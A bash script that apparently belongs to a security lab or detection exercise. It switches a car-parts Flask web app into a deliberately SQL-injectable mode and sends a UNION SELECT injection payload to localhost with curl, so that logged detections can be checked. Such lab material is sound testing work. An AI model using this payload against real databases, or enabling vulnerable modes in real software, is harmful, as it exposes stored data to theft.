#!/bin/bash
# Provocation script for SQL Injection (Loki 4)
# Run this on the Web VM (10.0.27.223)

CONTAINER_NAME="carparts-web"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
COMPOSE_FILE="$SCRIPT_DIR/../../pve1/vm-web/docker-compose.yml"

echo "Provoking SQL Injection vulnerability by setting SQL_INJECTION_VULNERABLE=true..."

# Add SQL_INJECTION_VULNERABLE: "true" to compose file if not present
if ! grep -q "SQL_INJECTION_VULNERABLE" "$COMPOSE_FILE"; then
    echo "Adding SQL_INJECTION_VULNERABLE environment variable..."
    sed -i '/DB_PASSWORD: carparts_pass/a \      SQL_INJECTION_VULNERABLE: "true"' "$COMPOSE_FILE"
else
    echo "Updating SQL_INJECTION_VULNERABLE to true..."
    sed -i 's/SQL_INJECTION_VULNERABLE:.*/SQL_INJECTION_VULNERABLE: "true"/' "$COMPOSE_FILE"
fi

# Rebuild/Restart the container
echo "Rebuilding and restarting web container..."
cd "$SCRIPT_DIR/../../pve1/vm-web"
docker compose up -d --build

# Wait for container to start
echo "Waiting 5 seconds for Flask app to start..."
sleep 5

# Trigger SQL injection attack using curl
echo "Sending mock SQL Injection attack payload..."
curl -s -G --data-urlencode "q=xyz' = 'abc') UNION SELECT 'injected_part_num', 'injected_part', 'injected_cat', 'injected_mfr', 99, 9.99, 'injected_compat' --" http://localhost:8000/ > /dev/null

echo "----------------------------------------------------"
echo "SQL Injection scenario active and tested."
echo "Check logs using: docker logs $CONTAINER_NAME"
echo "Look for: '[SECURITY] SQL Injection attempt detected'"
